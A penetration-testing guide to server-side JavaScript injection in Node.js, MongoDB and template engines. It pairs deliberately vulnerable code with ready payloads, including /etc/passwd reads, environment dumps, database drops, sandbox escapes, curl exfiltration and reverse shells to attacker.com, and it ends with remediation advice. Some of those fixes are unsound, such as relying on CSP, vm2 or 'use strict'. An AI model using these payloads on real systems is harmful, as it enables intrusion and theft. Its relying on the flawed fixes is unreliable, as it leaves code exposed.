# Server-Side JavaScript Injection (SSJI)

## Description
Server-Side JavaScript Injection (SSJI) is a vulnerability that occurs when user-controlled input is evaluated or executed as JavaScript code on the server side. This commonly affects Node.js applications, but can also impact other server-side JavaScript environments like MongoDB queries, ElectronJS applications, and server-side rendering frameworks.

## How SSJI Works
Unlike client-side XSS, SSJI executes JavaScript code on the server, potentially allowing attackers to:
- Execute arbitrary system commands
- Access server files and sensitive data
- Bypass authentication and authorization
- Manipulate database queries
- Achieve Remote Code Execution (RCE)

## Common Vulnerable Functions

### Node.js
- `eval()` - Directly evaluates JavaScript code
- `Function()` constructor - Creates and executes functions
- `setTimeout()/setInterval()` with string arguments
- `vm.runInNewContext()` without proper sandboxing
- `child_process.exec()` with unsanitized input
- Template engines (Handlebars, Pug, EJS) with unsafe rendering

### MongoDB
- `$where` operator - Evaluates JavaScript in queries
- `mapReduce()` - Can execute arbitrary JavaScript
- `$function` aggregation operator

## Common Attack Vectors
- User input fields
- JSON API parameters
- Template rendering
- MongoDB queries
- Configuration files
- Cookie values
- HTTP headers
- File upload metadata
- Server-side rendering (SSR)

## Testing Methodology & PoC Examples

### PoC 1: Basic eval() Injection

**Vulnerability:** User input passed directly to `eval()`.

**Vulnerable Code:**
```javascript
// Vulnerable Node.js code
app.get('/calculate', (req, res) => {
    const result = eval(req.query.expression);
    res.json({ result });
});
```

**Steps to Test:**
1. Identify input that might be evaluated
2. Test with mathematical expressions
3. Inject JavaScript code

**Request:**
```http
GET /calculate?expression=2+2 HTTP/1.1
Host: example.com
# Normal response: {"result": 4}

GET /calculate?expression=require('child_process').execSync('whoami').toString() HTTP/1.1
Host: example.com
# RCE: Returns username
```

**Payload Examples:**
```javascript
2+2
Math.random()
require('fs').readFileSync('/etc/passwd', 'utf8')
require('child_process').execSync('cat /etc/passwd').toString()
global.process.mainModule.require('child_process').execSync('id').toString()
```

---

### PoC 2: Function Constructor Injection

**Vulnerability:** Using Function constructor with user input.

**Vulnerable Code:**
```javascript
app.post('/execute', (req, res) => {
    const fn = new Function('return ' + req.body.code);
    const result = fn();
    res.json({ result });
});
```

**Request:**
```http
POST /execute HTTP/1.1
Host: example.com
Content-Type: application/json

{"code": "require('child_process').execSync('ls -la').toString()"}
```

**Payloads:**
```javascript
require('fs').readFileSync('/etc/passwd', 'utf8')
process.env
global.process.mainModule.constructor._load('child_process').execSync('whoami').toString()
```

---

### PoC 3: MongoDB $where Injection

**Vulnerability:** User input in MongoDB `$where` queries.

**Vulnerable Code:**
```javascript
// Vulnerable MongoDB query
app.get('/users', async (req, res) => {
    const users = await User.find({
        $where: `this.username == '${req.query.username}'`
    });
    res.json(users);
});
```

**Request:**
```http
GET /users?username=admin' || '1'=='1 HTTP/1.1
Host: example.com
# Returns all users

GET /users?username=admin'; return true; // HTTP/1.1
Host: example.com
# Bypasses query, returns all users
```

**Payloads:**
```javascript
admin' || '1'=='1
'; return true; //
'; return this.password.match(/^a/); //
'; var http = require('http'); return true; //
'; db.users.drop(); return true; //
```

---

### PoC 4: Template Injection (Handlebars, Pug, EJS)

**Vulnerability:** Unsafe template rendering with user input.

**Vulnerable Handlebars Code:**
```javascript
const Handlebars = require('handlebars');
app.get('/greet', (req, res) => {
    const template = Handlebars.compile('Hello {{name}}!');
    const result = template({ name: req.query.name });
    res.send(result);
});
```

**Handlebars SSJI Payloads:**
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**EJS Template Injection:**
```javascript
<%= global.process.mainModule.require('child_process').execSync('cat /etc/passwd') %>
<%= require('child_process').execSync('ls -la').toString() %>
```

**Pug Template Injection:**
```pug
#{global.process.mainModule.require('child_process').execSync('id')}
#{function(){return require('child_process').execSync('whoami')}()}
```

---

### PoC 5: vm.runInNewContext() Bypass

**Vulnerability:** Improper use of Node.js VM module.

**Vulnerable Code:**
```javascript
const vm = require('vm');
app.post('/execute', (req, res) => {
    const sandbox = {};
    const result = vm.runInNewContext(req.body.code, sandbox);
    res.json({ result });
});
```

**Sandbox Escape Payloads:**
```javascript
this.constructor.constructor('return process')()
this.constructor.constructor('return global.process.mainModule.require("child_process").execSync("whoami").toString()')()
(function(){return this.constructor.constructor('return process')()})()
({}).constructor.constructor('return this.process.mainModule.require("child_process").execSync("id").toString()')()
```

---

### PoC 6: setTimeout/setInterval String Evaluation

**Vulnerability:** Using setTimeout/setInterval with string arguments.

**Vulnerable Code:**
```javascript
app.post('/schedule', (req, res) => {
    setTimeout(req.body.callback, 1000);
    res.json({ scheduled: true });
});
```

**Payloads:**
```javascript
require('child_process').exec('curl attacker.com/?data=$(cat /etc/passwd)')
require('fs').writeFileSync('/tmp/pwned', 'hacked')
global.process.exit(1)
```

---

### PoC 7: JSON.parse with Prototype Pollution

**Vulnerability:** Unsafe parsing leading to prototype pollution and code execution.

**Request:**
```http
POST /api/update HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "__proto__": {
    "isAdmin": true,
    "toString": "require('child_process').execSync('whoami').toString()"
  }
}
```

---

### PoC 8: Express Server-Side Rendering

**Vulnerability:** Unsafe SSR with user-controlled templates.

**Vulnerable Code:**
```javascript
app.get('/render', (req, res) => {
    res.render('template', {
        userInput: req.query.input
    });
});
```

**If template uses unsafe rendering:**
```
input=<%= global.process.mainModule.require('child_process').execSync('id') %>
```

---

### PoC 9: child_process with Unsanitized Input

**Vulnerability:** Command injection via child_process.

**Vulnerable Code:**
```javascript
const { exec } = require('child_process');
app.get('/ping', (req, res) => {
    exec(`ping -c 4 ${req.query.host}`, (error, stdout) => {
        res.send(stdout);
    });
});
```

**Payloads:**
```bash
127.0.0.1; cat /etc/passwd
127.0.0.1 && whoami
127.0.0.1 | nc attacker.com 4444 -e /bin/bash
`curl attacker.com/?data=$(cat /etc/passwd)`
$(curl attacker.com/?data=$(whoami))
```

---

### PoC 10: MongoDB mapReduce Injection

**Vulnerability:** User input in MongoDB mapReduce operations.

**Vulnerable Code:**
```javascript
app.post('/aggregate', async (req, res) => {
    const result = await User.mapReduce(
        function() { eval(userInput); emit(this._id, 1); },
        function(k, v) { return Array.sum(v); },
        { out: "result" }
    );
});
```

**Payload:**
```javascript
db.users.find().forEach(function(user) { 
    db.stolen.insert(user); 
});
```

---

## Exploitation Techniques

### 1. Remote Code Execution
```javascript
require('child_process').execSync('bash -i >& /dev/tcp/attacker.com/4444 0>&1')
require('child_process').spawn('nc', ['-e', '/bin/bash', 'attacker.com', '4444'])
```

### 2. File System Access
```javascript
require('fs').readFileSync('/etc/passwd', 'utf8')
require('fs').writeFileSync('/tmp/backdoor.js', 'malicious code')
require('fs').readdirSync('/').toString()
```

### 3. Environment Variable Exfiltration
```javascript
process.env
JSON.stringify(process.env)
```

### 4. Database Access
```javascript
require('mongoose').connection.db.admin().listDatabases()
```

### 5. Module Loading
```javascript
require('module')._load('child_process')
global.process.mainModule.require('fs')
```

## Tools for Testing

### 1. **Manual Testing with cURL**
```bash
curl "https://example.com/api?expr=require('os').userInfo()"
curl -X POST https://example.com/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()"}'
```

### 2. **Burp Suite**
- Intercept requests
- Inject SSJI payloads in parameters
- Use Intruder for automated testing

### 3. **Custom Scripts**
```javascript
const axios = require('axios');

const payloads = [
    'require("fs").readFileSync("/etc/passwd", "utf8")',
    'require("child_process").execSync("whoami").toString()',
    'global.process.mainModule.require("child_process").execSync("id").toString()'
];

for (const payload of payloads) {
    axios.post('https://example.com/execute', {
        code: payload
    }).then(res => {
        console.log(`Payload: ${payload}`);
        console.log(`Result: ${res.data}`);
    });
}
```

### 4. **MongoDB Testing**
```javascript
const MongoClient = require('mongodb').MongoClient;

// Test $where injection
db.users.find({
    $where: "this.username == 'admin' || true"
});
```

## Exploitation Impact

- **Critical:** Remote Code Execution (RCE)
- **High:** Server compromise, data exfiltration
- **Sensitive Data Access:** Database credentials, environment variables, files
- **Denial of Service:** Process termination, resource exhaustion
- **Lateral Movement:** Access to internal networks

## Remediation

### 1. **Never Use eval() or Function()**
```javascript
// Bad
const result = eval(userInput);

// Good - Use safe alternatives
const result = math.evaluate(userInput); // Using math.js library
```

### 2. **Sanitize Input**
```javascript
// Validate and sanitize all user input
const validator = require('validator');
if (!validator.isNumeric(input)) {
    throw new Error('Invalid input');
}
```

### 3. **Use Safe Alternatives**
```javascript
// Bad
exec(`command ${userInput}`);

// Good
execFile('command', [userInput]);
```

### 4. **Avoid $where in MongoDB**
```javascript
// Bad
User.find({ $where: `this.username == '${input}'` });

// Good
User.find({ username: input });
```

### 5. **Secure Template Rendering**
```javascript
// Use safe template rendering options
app.set('view options', {
    allowProtoProperties: false,
    allowProtoMethodsByDefault: false
});
```

### 6. **Input Validation**
```javascript
const Joi = require('joi');
const schema = Joi.object({
    expression: Joi.string().regex(/^[0-9+\-*/() ]+$/)
});
const { error, value } = schema.validate(req.body);
```

### 7. **Least Privilege**
- Run Node.js with minimal permissions
- Use containers with restricted capabilities
- Implement proper file system permissions

### 8. **Content Security Policy**
```javascript
app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"]
    }
}));
```

### 9. **Disable Dangerous Features**
```javascript
// Disable eval in strict mode
'use strict';

// Use VM2 instead of vm for better sandboxing
const { VM } = require('vm2');
const vm = new VM({
    timeout: 1000,
    sandbox: {}
});
```

### 10. **Security Auditing**
- Regular code reviews
- Use linters (ESLint with security plugins)
- Dependency scanning (npm audit, Snyk)
- Penetration testing

## Detection and Monitoring

### 1. **Log Suspicious Activity**
```javascript
// Log eval usage
const originalEval = eval;
eval = function(...args) {
    logger.warn('eval() called', { args });
    return originalEval(...args);
};
```

### 2. **Monitor System Calls**
- Watch for unexpected child processes
- Monitor file system access
- Track network connections

### 3. **Runtime Protection**
```javascript
// Freeze dangerous globals
Object.freeze(require);
Object.freeze(global);
```

## References

- [OWASP - Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [Node.js Security Best Practices](https://nodejs.org/learn/getting-started/security-best-practices)
- [MongoDB Security Checklist](https://docs.mongodb.com/manual/administration/security-checklist/)
- [Avoiding eval and new Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval!)
- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)

## Payloads

See `ssji-payloads.txt` for a comprehensive list of SSJI payloads and injection techniques.
